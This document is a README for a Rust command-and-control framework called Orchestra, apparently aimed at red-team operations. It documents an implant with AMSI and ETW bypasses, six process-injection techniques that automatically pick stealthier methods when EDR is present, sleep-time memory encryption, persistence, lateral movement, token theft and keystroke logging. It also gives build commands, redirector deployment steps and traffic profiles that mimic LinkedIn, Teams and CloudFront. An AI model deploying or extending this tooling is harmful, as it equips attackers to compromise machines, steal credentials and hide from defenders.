# Orchestra

A cross-platform, operationally secure command-and-control framework built in Rust. Orchestra provides a malleable C2 pipeline, a unified injection engine with six techniques, advanced sleep obfuscation, and a standalone redirector binary — all designed for red-team operations requiring granular control over network signatures, memory forensics resistance, and payload delivery.

| | |
|---|---|
| **Language** | Rust 2021 edition |
| **Targets** | `x86_64-pc-windows-gnu`, `x86_64-unknown-linux-gnu`, `aarch64-unknown-linux-gnu` |
| **License** | Proprietary |

---

## Architecture Overview

```
                          ┌──────────────┐
                          │   Operator   │
                          │  (console /  │
                          │  web UI)     │
                          └──────┬───────┘
                                 │ HTTPS / WSS
                                 ▼
                          ┌──────────────┐
                          │  Orchestra   │
                          │   Server     │  ◄── Profile hot-reload
                          │  (axum 0.7)  │  ◄── Multi-profile listener
                          └──────┬───────┘  ◄── Module signing (Ed25519)
                                 │
                    ┌────────────┼────────────┐
                    │            │            │
              ┌─────▼────┐ ┌────▼─────┐ ┌────▼─────┐
              │Redirector│ │Redirector│ │Redirector│
              │  (TLS)   │ │  (TLS)   │ │  (TLS)   │
              └─────┬────┘ └────┬─────┘ └────┬─────┘
                    │            │            │
                    └────────────┼────────────┘
                                 │ HTTP/S (malleable)
                                 ▼
                          ┌──────────────┐
                          │    Agent     │
                          │ (in-memory)  │  ◄── Sleep obfuscation
                          │              │  ◄── Memory hygiene
                          └──────┬───────┘  ◄── Self-reencode
                                 │
                    ┌────────────┼────────────┐
                    │            │            │
              ┌─────▼────┐ ┌────▼─────┐ ┌────▼─────┐
              │ Injected │ │ Injected │ │  P2P     │
              │ Payload  │ │ Payload  │ │  Mesh    │
              └──────────┘ └──────────┘ └──────────┘
```

**Data flow**: Operator commands travel over TLS to the Orchestra server, which dispatches them through redirectors (optional) to the agent. The agent executes commands, injects into target processes, and returns results through the same malleable channel. P2P mesh links allow agents to chain through SMB pipes or TCP for lateral reach without direct C2 connectivity.

### Workspace Crates

| Crate | Type | Purpose |
|-------|------|---------|
| `agent` | lib + bin | Implant: C2 transports, evasion, injection, sleep obfuscation, persistence |
| `orchestra-server` | bin | Control center: agent management, module signing, build queue, profile hot-reload |
| `redirector` | bin | Standalone HTTP reverse proxy with cover traffic and registration |
| `common` | lib | Wire protocol (`Message`, `Command`), `Transport` trait, crypto, config types |
| `hollowing` | lib | Process hollowing via NT APIs (PE unmapping, IAT fixup, relocation) |
| `builder` | lib | Cross-compilation build pipeline, PE artifact hardening, profile management |
| `console` | bin | CLI operator console (direct agent connection) |
| `launcher` | bin | Stager: downloads encrypted payload, decrypts, executes via `memfd_create` |
| `keygen` | bin | Generates AES-256 module keys and Ed25519 signing keypairs |
| `payload-packager` | bin | Encrypts agent binaries (AES-256-GCM, polymorphic, stub emission) |
| `shellcode_packager` | lib | Converts PE payloads to position-independent shellcode |
| `module_loader` | lib | Plugin loader: decrypt → verify → memfd/manual-map → FFI |
| `string_crypt` | proc-macro | Compile-time string encryption (`enc_str!`, `enc_wstr!`, `stack_str!`) |
| `code_transform` | lib | Binary diversification: opaque predicates, block reordering, substitution, reg alloc |
| `code_transform_macro` | proc-macro | Attribute macro for per-function code transformation |
| `optimizer` | lib | x86_64 instruction-level optimization passes (NOP insertion, scheduling, substitution) |
| `junk_macro` | proc-macro | Junk code insertion at function boundaries |
| `nt_syscall` | lib | Direct/indirect syscall infrastructure (SSN resolution, Halo's Gate, clean ntdll mapping) |
| `pe_resolve` | lib | PEB walking, ROR-13 export hashing |
| `dev-server` | bin | Lightweight static file server for local testing |
| `orchestra-pe-hardener` | lib | PE header hardening transformations |
| `orchestra-side-load-gen` | lib | DLL side-load payload generator |

---

## Feature Matrix

| Capability | Windows | Linux | macOS | Notes |
|------------|:-------:|:-----:|:-----:|-------|
| **Indirect Syscalls** (call r11 / Halo's Gate) | ✅ | — | — | `direct-syscalls` feature; clean ntdll mapping for SSN resolution |
| **HWBP AMSI Bypass** (DR0/DR1 VEH) | ✅ | — | — | Vectored Exception Handler with hardware breakpoints |
| **Memory Patch AMSI Bypass** (E_INVALIDARG) | ✅ | — | — | `NtProtectVirtualMemory` syscall, COM hijack fallback |
| **ETW Patching** (NtProtectVirtualMemory) | ✅ | — | — | Patches `EtwEventWrite`, `EtwEventWriteEx`, `NtTraceEvent` |
| **XChaCha20-Poly1305 Memory Guard** | ✅ | ✅ | ✅ | `memory-guard` feature; XMM14/XMM15 key stash on Windows |
| **NtContinue Call Stack Spoofing** | ✅ | — | — | Stack-spoofed syscall dispatch via `NtContinue` |
| **Process Hollowing** | ✅ | — | — | Create suspended → unmap → write → fix relocations/IAT → resume |
| **Module Stomping** (NtWaitForSingleObject) | ✅ | — | — | Overwrites `.text` of legitimate signed DLL in target |
| **EarlyBird APC Injection** | ✅ | — | — | QueueUserAPC before thread resumes |
| **Thread Hijacking** | ✅ | — | — | Suspend → rewrite RIP → resume |
| **Thread Pool Injection** | ✅ | — | — | `TpAllocWork` / `TpPostWork` callback execution |
| **Fiber Injection** | ✅ | — | — | `CreateFiber` → `SwitchToFiber` |
| **Unified Injection Engine** | ✅ | ✅ | — | Auto-selects technique based on EDR recon; 6-technique fallback chain |
| **Pre-Injection EDR Reconnaissance** | ✅ | — | — | Module enumeration, integrity check, architecture verification |
| **Sleep Obfuscation** (full memory encryption) | ✅ | ✅ | ✅ | XChaCha20-Poly1305 region encryption; stack encryption on Windows |
| **Stack Encryption during Sleep** | ✅ | — | — | Full stack frame encryption with safety guarantees |
| **PEB Unlinking & Memory Hygiene** | ✅ | — | — | Module unlink, thread start scrub, handle table scrub |
| **Thread Start Address Scrubbing** | ✅ | — | — | Replaces thread start address to hide anomalous entry points |
| **Handle Table Scrubbing** | ✅ | — | — | Closes/obfuscates suspicious handles |
| **Remote Payload Sleep Enrollment** | ✅ | — | — | Injected payloads opt into the agent's sleep obfuscation cycle |
| **Malleable C2 Profiles** (TOML) | ✅ | ✅ | ✅ | Full profile system: URIs, headers, transforms, SSL, DNS |
| **HTTP Transaction Transforms** | ✅ | ✅ | ✅ | Prepend/append/encode per transaction (GET/POST) |
| **DNS Malleable Profiles** | ✅ | ✅ | ✅ | hex/base32/base64url encoding, configurable beacon/task URIs |
| **DNS-over-HTTPS** (DoH) | ✅ | ✅ | ✅ | Google DoH resolver, configurable server |
| **Domain Fronting** | ✅ | ✅ | ✅ | Separate SNI from actual Host header |
| **Redirection Chains** | ✅ | ✅ | ✅ | Multi-hop failover with sticky sessions + exponential backoff |
| **Forward Secrecy** (X25519 ECDH) | ✅ | ✅ | ✅ | `forward-secrecy` feature; mandatory ECDH key agreement |
| **Server-Signed Module Delivery** | ✅ | ✅ | ✅ | Ed25519 signatures on all pushed modules |
| **Multi-Operator Audit Attribution** | ✅ | ✅ | ✅ | Per-operator HMAC-SHA256 audit log |
| **Compile-Time String Encryption** | ✅ | ✅ | ✅ | `string_crypt` proc-macros; ChaCha20 with per-build keys |
| **Binary Diversification** | ✅ | ✅ | ✅ | `junk_macro`, `optimizer`, `code_transform`, `self_reencode` |
| **Cross-Platform Persistence** | ✅ | ✅ | ✅ | Registry Run, COM Hijack, LaunchAgent, cron, WMI via COM |
| **Lateral Movement** | ✅ | — | — | PsExec, WMI, DCOM, WinRM — no PowerShell |
| **Linux In-Memory Execution** | — | ✅ | — | `memfd_create` + `fexecve` |
| **Linux RW→RX Transition** | — | ✅ | — | `mmap` RW → write → `mprotect` RX |
| **Token Manipulation** | ✅ | — | — | MakeToken, StealToken, Rev2Self, GetSystem; thread-safe |
| **HKDF-SHA256 Key Derivation** | ✅ | ✅ | ✅ | All session keys derived via HKDF |
| **Per-Build Randomized IoCs** | ✅ | ✅ | ✅ | `build.rs` generates random pipe names, DNS prefixes, service names |
| **Server Credential Enforcement** | ✅ | ✅ | ✅ | No default credentials; startup fails without explicit tokens |
| **Profile Hot-Reload** | ✅ | ✅ | ✅ | Server watches profile directory; zero-downtime updates |
| **Multi-Profile Support** | ✅ | ✅ | ✅ | Multiple profiles served simultaneously per listener |

---

## Quick Start

### Prerequisites

```bash
# Install Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Add Windows cross-compilation target
rustup target add x86_64-pc-windows-gnu

# Install MinGW cross-compiler (Linux host)
sudo apt install mingw-w64  # Debian/Ubuntu
```

### Build the Server

```bash
cargo build --release --package orchestra-server
```

Create a server configuration file (e.g., `orchestra-server.toml`):

```toml
http_addr = "0.0.0.0:8443"
agent_addr = "0.0.0.0:9443"
agent_shared_secret = "your-32-byte-secret-base64-encoded"
admin_token = "your-admin-token-here"
agent_cert_pem = "certs/agent.crt"
agent_key_pem = "certs/agent.key"

[operators.admin]
name = "admin"
token = "operator-token-here"
permissions = ["all"]
```

```bash
./target/release/orchestra-server --config orchestra-server.toml
```

### Build an Agent

```bash
# Cross-compile for Windows with HTTP transport
cargo build --release --package agent \
    --target x86_64-pc-windows-gnu \
    --features "http-transport,outbound-c"

# Cross-compile for Linux with DoH transport
cargo build --release --package agent \
    --features "doh-transport,outbound-c" \
    --target x86_64-unknown-linux-gnu
```

Or use the build API through the server dashboard to build on-demand with specific profiles and features.

### Build a Redirector

```bash
cargo build --release --package redirector
```

```bash
./target/release/redirector \
    --listen-addr 0.0.0.0:443 \
    --c2-addr 10.0.0.1:8443 \
    --profile profiles/cloudfront.profile \
    --cover-content /var/www/cover/ \
    --tls-cert /etc/letsencrypt/live/example.com/fullchain.pem \
    --tls-key /etc/letsencrypt/live/example.com/privkey.pem \
    --server-api https://10.0.0.1:8443 \
    --server-token your-admin-token
```

### Minimal Malleable Profile

```toml
[profile]
name = "quickstart"
author = "operator"
description = "Minimal profile for testing"

[global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

[http_get]
uri = ["/api/v1/status", "/api/v1/health"]
verb = "GET"

[http_get.headers]
Accept = "application/json"
Connection = "keep-alive"

[http_get.client]
prepend = """"""
append = """"""

[http_post]
uri = ["/api/v1/data", "/api/v1/report"]
verb = "POST"

[http_post.headers]
Content-Type = "application/json"

[dns]
enabled = false
```

---

## Malleable Profiles

The malleable C2 profile system controls every aspect of the agent's network communication: URIs, headers, HTTP transaction transforms, DNS encoding, SSL settings, and timing. Profiles are defined in TOML and loaded at build time or hot-reloaded on the server.

### TOML Schema

#### `[profile]` — Profile Metadata

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `name` | string | `"default"` | Profile identifier |
| `author` | string | `""` | Author attribution |
| `description` | string | `""` | Profile description |

#### `[global]` — Global Settings

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `user_agent` | string | Chrome 125 UA | HTTP User-Agent string |
| `jitter` | u8 | `0` | Sleep jitter percentage (0–100) |
| `sleep_time` | u64 | `60` | Base sleep interval in seconds |
| `dns_idle` | string | `"0.0.0.0"` | DNS idle IP for beacon |
| `dns_sleep` | u64 | `0` | DNS query interval |

#### `[ssl]` — TLS Configuration

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `true` | Enable TLS |
| `cert_pin` | string | `""` | SHA-256 hex fingerprint for certificate pinning |
| `ja3_fingerprint` | string | `""` | JA3 fingerprint for TLS client hello |
| `sni` | string | `""` | Custom SNI hostname |

#### `[http_get]` / `[http_post]` — HTTP Transactions

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `uri` | string[] | `[]` | List of URI paths (randomly selected per request) |
| `verb` | string | `"GET"` / `"POST"` | HTTP method |
| `headers` | map | `{}` | HTTP headers to send |

Sub-tables `[http_get.client]`, `[http_get.server]`, `[http_post.client]`, `[http_post.server]`:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `prepend` | string | `""` | Prepend to data before encoding |
| `append` | string | `""` | Append to data after encoding |
| `transform` | string | `"None"` | Transform type: `None`, `Base64`, `Base64Url`, `Mask`, `Netbios`, `NetbiosU` |
| `mask_stride` | u32 | `0` | Mask XOR stride (for `Mask` transform) |

#### `[http_get.metadata]` / `[http_post.output]` — Data Delivery

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `delivery` | string | `"Cookie"` / `"Body"` | Delivery method: `Cookie`, `UriAppend`, `Header`, `Body` |
| `key` | string | `"session"` | Key name for Cookie/Header/UriAppend delivery |
| `transform` | string | `"Base64"` | Transform applied to data |

#### `[dns]` — DNS C2 Configuration

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | `false` | Enable DNS C2 |
| `beacon` | string | `""` | Beacon query pattern |
| `get_A` | string | `""` | Task retrieval A record pattern |
| `get_TXT` | string | `""` | Task retrieval TXT record pattern |
| `post` | string | `""` | Data exfil query pattern |
| `max_txt_size` | u32 | `252` | Max TXT record payload size |
| `dns_suffix` | string | `""` | DNS suffix domain |
| `encoding` | string | `"hex"` | Encoding: `hex`, `base32`, `base64url` |

#### `[dns.headers]` — DoH Configuration

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `doh_server` | string | `"https://dns.google/dns-query"` | DoH resolver URL |
| `doh_method` | string | `"POST"` | DoH HTTP method |

### Transform Types

| Transform | Encoding | Decoding | Notes |
|-----------|----------|----------|-------|
| `None` | Identity | Identity | No transformation |
| `Base64` | Standard Base64 | Standard Base64 | `+/` with `=` padding |
| `Base64Url` | URL-safe Base64 | URL-safe Base64 | `-_` without padding |
| `Mask` | XOR with rotating key | XOR with rotating key | `mask_stride` controls key rotation |
| `Netbios` | NetBIOS encoding (A–P) | NetBIOS decoding | Uppercase hex nibble + 'A' |
| `NetbiosU` | NetBIOS encoding (a–p) | NetBIOS decoding | Lowercase hex nibble + 'a' |

### Delivery Methods

| Method | Agent Sends Data | Server Sends Data |
|--------|-----------------|-------------------|
| `Cookie` | Data in `Cookie` header | Data in `Set-Cookie` header |
| `UriAppend` | Data appended to URI after separator | Data extracted from URI |
| `Header` | Data in custom header | Data in response header |
| `Body` | Data in HTTP body | Data in response body |

### Example Profile: LinkedIn Mimic

```toml
[profile]
name = "linkedin"
author = "red-team"
description = "Mimics LinkedIn API traffic"

[global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
jitter = 37
sleep_time = 60

[ssl]
enabled = true
cert_pin = ""
sni = ""

[http_get]
uri = ["/linkedin/li", "/voyager/api/me", "/voyager/api/growth/normInvitations"]
verb = "GET"

[http_get.headers]
Accept = "application/vnd.linkedin.normalized+json+2.1"
Connection = "keep-alive"
Referer = "https://www.linkedin.com/feed/"

[http_get.metadata]
delivery = "Cookie"
key = "li_at"
transform = "Base64"

[http_get.client]
prepend = "JSESSIONID=ajax:1234567890;"
append = ";"

[http_get.server]
prepend = ""
append = ""

[http_post]
uri = ["/voyager/api/growth/normInvitationAction", "/voyager/api/events/drilldowns"]
verb = "POST"

[http_post.headers]
Accept = "application/json"
Content-Type = "application/json"
Referer = "https://www.linkedin.com/feed/"

[http_post.output]
delivery = "Body"
transform = "Base64"

[http_post.client]
prepend = "{\"csrfToken\":\"ajax:1234567890\",\"data\":\""
append = "\"}"

[http_post.server]
prepend = ""
append = ""

[dns]
enabled = false
```

### Example Profile: CloudFront/CDN with Domain Fronting

```toml
[profile]
name = "cloudfront"
author = "red-team"
description = "CloudFront CDN profile with domain fronting and redirectors"

[global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
jitter = 20
sleep_time = 45

[ssl]
enabled = true
cert_pin = ""
sni = ""

[http_get]
uri = ["/cdn-cgi/trace", "/images/sprites/nav-sprite_global-1x-hm-dsk-reorg._CB405686684_.png"]
verb = "GET"

[http_get.headers]
Host = "d111111abcdef8.cloudfront.net"
Accept = "image/webp,image/apng,image/*,*/*;q=0.8"
Connection = "keep-alive"

[http_get.metadata]
delivery = "Cookie"
key = "CloudFront-Policy"
transform = "Base64Url"

[http_get.client]
prepend = ""
append = ""

[http_get.server]
prepend = ""
append = ""

[http_post]
uri = ["/cdn-cgi/beacon/performance", "/api/1.0/website/monitor"]
verb = "POST"

[http_post.headers]
Host = "d111111abcdef8.cloudfront.net"
Content-Type = "application/octet-stream"
Accept = "*/*"

[http_post.output]
delivery = "Body"
transform = "Base64Url"

[http_post.client]
prepend = ""
append = ""

[http_post.server]
prepend = ""
append = ""

[dns]
enabled = false
```

Domain fronting is configured at build time via the `front_domain` field in the agent's C2 configuration. The agent connects to the front domain's IP but sends the `Host` header matching the profile's configured header. This causes CDN edge nodes to route to the correct origin (the redirector or direct C2).

### Example Profile: Microsoft Teams

```toml
[profile]
name = "teams"
author = "red-team"
description = "Mimics Microsoft Teams API traffic for corporate environments"

[global]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Teams/24100.1.0.0"
jitter = 25
sleep_time = 50

[ssl]
enabled = true
cert_pin = ""
sni = ""

[http_get]
uri = ["/v1/users/ME/conversations", "/v1/users/ME/contacts", "/api/calls/getCalls"]
verb = "GET"

[http_get.headers]
Accept = "application/json"
Authorization = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6I"
Connection = "keep-alive"
Referer = "https://teams.microsoft.com/"
X-Ms-Client-Version = "24100.1.0.0"

[http_get.metadata]
delivery = "Header"
key = "X-Ms-Telemetry"
transform = "Base64"

[http_get.client]
prepend = "v1/users/ME/"
append = "/messages"

[http_get.server]
prepend = ""
append = ""

[http_post]
uri = ["/v1/users/ME/conversations/48:notes/messages", "/v1/users/ME/chats/presence"]
verb = "POST"

[http_post.headers]
Accept = "application/json"
Content-Type = "application/json"
Referer = "https://teams.microsoft.com/"
X-Ms-Client-Version = "24100.1.0.0"

[http_post.output]
delivery = "Body"
transform = "Base64"

[http_post.client]
prepend = "{\"content\":\""
append = "\",\"messagetype\":\"RichText/Html\"}"

[http_post.server]
prepend = ""
append = ""

[dns]
enabled = false
```

---

## Injection Engine

The unified injection engine (`injection_engine.rs`) provides a single API for injecting payloads into target processes with automatic technique selection, EDR reconnaissance, and fallback chains.

### Techniques

| Technique | Method | EDR Evasion | Best For |
|-----------|--------|-------------|----------|
| **Process Hollowing** | Create suspended → unmap → write payload → fix relocations/IAT → resume | Medium — creates visible process | Standalone payloads |
| **Module Stomping** | Overwrite `.text` of legitimate signed DLL in target | High — runs inside legitimate module | Long-lived implants |
| **EarlyBird APC** | `QueueUserAPC` on suspended thread before resume | High — executes before main thread | Process creation hooks |
| **Thread Hijacking** | Suspend → rewrite RIP → resume | Medium — visible thread anomaly | Quick shellcode |
| **Thread Pool** | `TpAllocWork` / `TpPostWork` callback | Very High — no new thread created | Async operations |
| **Fiber Injection** | `CreateFiber` → `SwitchToFiber` | High — fiber context switch | Complex payloads |

### Pre-Injection EDR Reconnaissance

Before injection, the engine performs reconnaissance on the target process:

1. **Module enumeration** — Walks PEB to list loaded DLLs
2. **EDR module detection** — Checks for known EDR driver DLLs (CrowdStrike, SentinelOne, Carbon Black, etc.)
3. **Architecture match** — Verifies target process matches agent architecture
4. **Integrity level** — Checks if target is running elevated

Returns `InjectionViability`:
- `Safe { arch_match, thread_count, integrity_level, recommended_technique }` — No EDR detected
- `HasEDRModule { modules, fallback_technique }` — EDR present, suggests stealthier technique
- `IsEDR` — Target is an EDR process itself; abort
- `ArchitectureMismatch` — 32-bit vs 64-bit mismatch

### Decision Flowchart

```
Target process identified
         │
         ▼
┌─────────────────────┐
│ Pre-injection recon │
│  - Walk PEB         │
│  - Check EDR DLLs   │
│  - Verify arch      │
│  - Check integrity  │
└────────┬────────────┘
         │
    ┌────▼────┐
    │Is EDR?  │──── Yes ──► ABORT
    └────┬────┘
         │ No
    ┌────▼────────┐
    │EDR modules? │──── Yes ──► Select stealthiest technique
    └────┬────────┘             (ThreadPool > Fiber > ModuleStomp)
         │ No
    ┌────▼────────────────┐
    │ User-specified      │──── Yes ──► Use specified technique
    │ technique?          │
    └────┬────────────────┘
         │ No (auto-select)
    ┌────▼────────────────────┐
    │ Priority:               │
    │ 1. ThreadPool           │
    │ 2. Fiber                │
    │ 3. EarlyBird APC        │
    │ 4. ModuleStomp          │
    │ 5. ThreadHijack         │
    │ 6. ProcessHollow        │
    └────┬────────────────────┘
         │
    ┌────▼──────┐
    │ Inject    │──── Failure ──► Try next technique
    └────┬──────┘
         │ Success
    ┌────▼──────────┐
    │ Optionally    │
    │ enroll in     │
    │ sleep cycle   │
    └───────────────┘
```

### Remote Payload Sleep Enrollment

Injected payloads can opt into the agent's sleep obfuscation cycle via `InjectionHandle::enroll_sleep()`. This installs a per-payload stub that:
1. Receives the encryption key via XMM14/XMM15 registers
2. Encrypts the payload's memory region during agent sleep
3. Decrypts on wake

---

## Sleep Obfuscation

The sleep obfuscation system (`sleep_obfuscation.rs`, `memory_guard.rs`, `obfuscated_sleep.rs`) encrypts all agent memory regions during idle periods to defeat memory scanning.

### Sleep Cycle

```
┌─────────────────────────────────────────────────────┐
│                    SLEEP CYCLE                       │
│                                                     │
│  1. Track memory regions (RW+RX pages)              │
│  2. Generate per-sleep XChaCha20-Poly1305 key       │
│  3. Stash key in XMM14/XMM15 registers             │
│  4. Encrypt all tracked regions                     │
│  5. Encrypt stack frames (optional)                 │
│  6. Spoof call stack (NtContinue)                   │
│  7. Anti-forensics:                                 │
│     - Unlink from PEB                               │
│     - Zero PE headers (NOACCESS)                    │
│     - Scrub thread start addresses                  │
│     - Scrub handle table                            │
│  8. Set wake timer                                  │
│  9. NtDelayExecution (sleep)                        │
│  10. Wake → integrity check (hash verification)     │
│  11. Decrypt all regions                            │
│  12. Decrypt stack                                  │
│  13. Resume normal operation                        │
└─────────────────────────────────────────────────────┘
```

### Memory Region Tracking

The system maintains a registry of memory regions to encrypt:

- **Agent `.text` section** — Primary code region
- **Agent `.rdata` / `.data` sections** — Read-only data and globals
- **Heap allocations** — Dynamically allocated buffers (via `memory_guard` registration)
- **Injected payload regions** — Remotely enrolled payload memory

Each region is snapshotted with its original protection level, encrypted with a unique nonce, and restored to its original state on wake.

### Stack Encryption

On Windows, the full stack is encrypted during sleep. The system:
1. Walks the stack from current RSP to the stack base
2. Identifies and preserves return addresses (for stack unwinding)
3. Encrypts all non-return-address bytes with XChaCha20-Poly1305
4. Restores on wake

### Integrity Verification

After wake, each decrypted region is hashed (SHA-256) and compared against the pre-sleep hash. Tampered regions trigger an alert and the agent enters a safe state.

### Key Management

- Per-sleep keys are generated using `OsRng`
- Keys are stashed in XMM14/XMM15 registers (Windows) to avoid memory exposure
- Keys are never written to disk or logged
- Key handles auto-zero on Drop

---

## Redirector Deployment

### Architecture

```
Internet                VPS (Redirector)              Internal Network
───────                 ────────────────              ────────────────

                          ┌──────────────┐
                          │  Redirector  │
                          │  (axum 0.7)  │
User ──HTTPS─────────────►│              │
                          │  Cover site  │
                          │  (static)    │
                          │              │───HTTPS───►┌──────────┐
                          │  URI matcher │            │  C2      │
                          │  (profile)   │            │  Server  │
                          └──────────────┘            └──────────┘
                                │
                                │ Registration/Heartbeat
                                └────────────────────────►
```

### Deployment Steps

1. **Provision VPS** — Any Linux VPS with public IP
2. **Obtain TLS certificate** — Use Let's Encrypt or custom CA
3. **Create cover content** — Static HTML/CSS/JS in a directory
4. **Write a malleable profile** — Matching the cover site's theme
5. **Start redirector** — Registers with Orchestra server automatically

```bash
# Generate certificates
certbot certonly --standalone -d redirect1.example.com

# Start redirector
./redirector \
    --listen-addr 0.0.0.0:443 \
    --c2-addr 10.0.0.1:8443 \
    --profile profiles/redirect1.profile \
    --cover-content /var/www/redirect1/ \
    --tls-cert /etc/letsencrypt/live/redirect1.example.com/fullchain.pem \
    --tls-key /etc/letsencrypt/live/redirect1.example.com/privkey.pem \
    --server-api https://10.0.0.1:8443 \
    --server-token "$(cat /opt/orchestra/token)"
```

### URI Matching

The redirector loads URI patterns from the malleable profile. Requests matching any configured URI (from `[http_get].uri` or `[http_post].uri`) are forwarded to the upstream C2 server. All other requests receive cover content from the configured directory.

### Registration and Heartbeat

On startup, the redirector registers with the Orchestra server via `POST /api/redirector/register`. It then sends heartbeats every 60 seconds via `POST /api/redirector/heartbeat`. The server marks redirectors as stale if no heartbeat is received within 300 seconds (configurable).

### Failover Behavior

The agent's `FailoverState` manages redirection chains:
1. **Sticky sessions** — Stick with the current endpoint for up to 10 successful requests
2. **Exponential backoff** — On failure, advance to next redirector with backoff (2s → 4s → 8s → ... → 60s max)
3. **Full cycle detection** — After trying all redirectors, fall back to direct C2
4. **Reconsideration** — After direct C2, periodically retry redirectors

### Managing Redirectors from Server CLI

```bash
# Register a new redirector
orchestra-server redirector add --url https://redirect1.example.com --profile-name cloudfront

# List all redirectors
orchestra-server redirector list

# Remove a redirector
orchestra-server redirector remove --identifier redirector-id-here
```

---

## Configuration Reference

### Server CLI Arguments

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--config` | path | `orchestra-server.toml` | Configuration file path |
| `--admin-token` | string | (from config) | Override admin authentication token |
| `--agent-secret` | string | (from config) | Override agent shared secret |
| `--profile-dir` | path | `profiles/` | Malleable profile directory |
| `--profile` | string | `default` | Active malleable profile name |

### Server Subcommands

| Command | Arguments | Description |
|---------|-----------|-------------|
| `validate-profile` | `--path <file>` | Validate a malleable profile TOML file |
| `redirector add` | `--url <url>`, `--profile-name <name>` | Register a redirector with the server |
| `redirector remove` | `--identifier <id>` | Remove a redirector |
| `redirector list` | — | List all registered redirectors |

### Redirector CLI Arguments

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--listen-addr` | socket addr | `0.0.0.0:8080` | Local bind address |
| `--c2-addr` | socket addr | (required) | Upstream C2 server address |
| `--profile` | path | (required) | Malleable profile file for URI matching |
| `--cover-content` | path | `./cover/` | Directory with static cover content |
| `--tls-cert` | path | None | TLS certificate PEM |
| `--tls-key` | path | None | TLS private key PEM |
| `--server-api` | url | None | Orchestra server API URL for registration |
| `--server-token` | string | None | Authentication token for server API |

### Agent Build-Time Features

| Feature | Description |
|---------|-------------|
| `http-transport` | Enable HTTP/S malleable C2 transport |
| `doh-transport` | Enable DNS-over-HTTPS C2 transport |
| `ssh-transport` | Enable SSH subsystem C2 transport |
| `smb-pipe-transport` | Enable SMB named pipe C2 transport |
| `outbound-c` | Enable outbound connection mode (agent dials server) |
| `direct-syscalls` | Enable direct/indirect syscall infrastructure |
| `memory-guard` | Enable heap region encryption during sleep |
| `self-reencode` | Enable runtime metamorphic re-encoding |
| `network-discovery` | Enable ARP scan, ping sweep, port scan |
| `persistence` | Enable cross-platform persistence mechanisms |
| `remote-assist` | Enable screen capture and input simulation |
| `hci-research` | Enable keyboard and window title logging |
| `p2p-tcp` | Enable peer-to-peer TCP mesh networking |
| `hot-reload` | Enable configuration hot-reload via file watcher |

### Environment Variables

| Variable | Context | Description |
|----------|---------|-------------|
| `ORCHESTRA_C_ADDR` | Agent build / runtime | Server address |
| `ORCHESTRA_C_SECRET` | Agent build / runtime | Pre-shared key |
| `ORCHESTRA_C_CERT_FP` | Agent build / runtime | Server certificate SHA-256 fingerprint |
| `ORCHESTRA_C_MTLS_CERT` | Agent build / runtime | mTLS client certificate PEM path |
| `ORCHESTRA_C_MTLS_KEY` | Agent build / runtime | mTLS client key PEM path |
| `ORCHESTRA_SECRET` | Agent runtime | Fallback shared secret |
| `ORCHESTRA_CONFIG_HMAC` | Agent runtime | Expected config HMAC |

### Launcher CLI Arguments

| Flag | Type | Description |
|------|------|-------------|
| `--url` | string | HTTPS URL of encrypted payload |
| `--key` | string | Base64-encoded AES-256 decryption key |
| `--allow-insecure-http` | bool | Allow HTTP downloads (dev only) |

### Console CLI Arguments

| Flag | Type | Description |
|------|------|-------------|
| `--target` | string | Agent address (IP:PORT) |
| `--key` | string | Base64 pre-shared key |
| `--tls` | bool | Enable mTLS transport |
| `--ca-cert` | path | CA certificate PEM |
| `--client-cert` | path | Client certificate PEM |
| `--client-key` | path | Client key PEM |
| `--insecure` | bool | Skip certificate verification |
| `--sni` | string | TLS SNI hostname |

---

## Operational Security Notes

### No PowerShell or wmic

All lateral movement uses native COM, WinRM SOAP/WS-Man, and direct NT API calls. No `powershell.exe` is ever spawned. This avoids:
- PowerShell Script Block Logging (Event ID 4104)
- AMSI integration in PowerShell
- Constrained Language Mode restrictions
- Command-line auditing in Security Event Log

### No RWX Memory

The agent never allocates `PAGE_EXECUTE_READWRITE` (RWX) memory. All code follows the RW→RX pattern:
1. Allocate `PAGE_READWRITE` (RW)
2. Write payload
3. `NtProtectVirtualMemory` → `PAGE_EXECUTE_READ` (RX)
4. Execute

On Linux, this is `mmap(PROT_READ|PROT_WRITE)` → write → `mprotect(PROT_READ|PROT_EXEC)`.

### Agent ID Never Plaintext

Agent identifiers are never transmitted in plaintext. All communications are encrypted with AES-256-GCM (or X25519 ECDH + HKDF when forward secrecy is enabled). Agent IDs are short 8-character hex strings derived from the session key, not hostnames or usernames.

### No Static Mut

All shared mutable state uses thread-safe primitives: `Arc<Mutex<T>>`, `Arc<RwLock<T>>`, `AtomicUsize`, `DashMap`, and `DashSet`. No `static mut` is used anywhere in the codebase, eliminating data race potential.

### Malleable Profiles

Malleable profiles ensure every HTTP transaction matches legitimate web traffic patterns. Custom User-Agent strings, realistic URI paths, standard headers, and data transforms (Base64, Mask, NetBIOS) make individual requests indistinguishable from normal browsing.

### Redirection Chains

Multi-hop redirector chains with sticky sessions ensure:
- The true C2 server IP is never exposed to the target network
- Each redirector presents legitimate cover traffic
- Failover occurs transparently with exponential backoff
- Health monitoring via heartbeats removes stale redirectors

### Domain Fronting

When used behind a CDN (CloudFront, Akamai, etc.), domain fronting:
- Sends TLS SNI matching the CDN's front domain
- Sends HTTP `Host` header matching the actual redirector/C2 endpoint
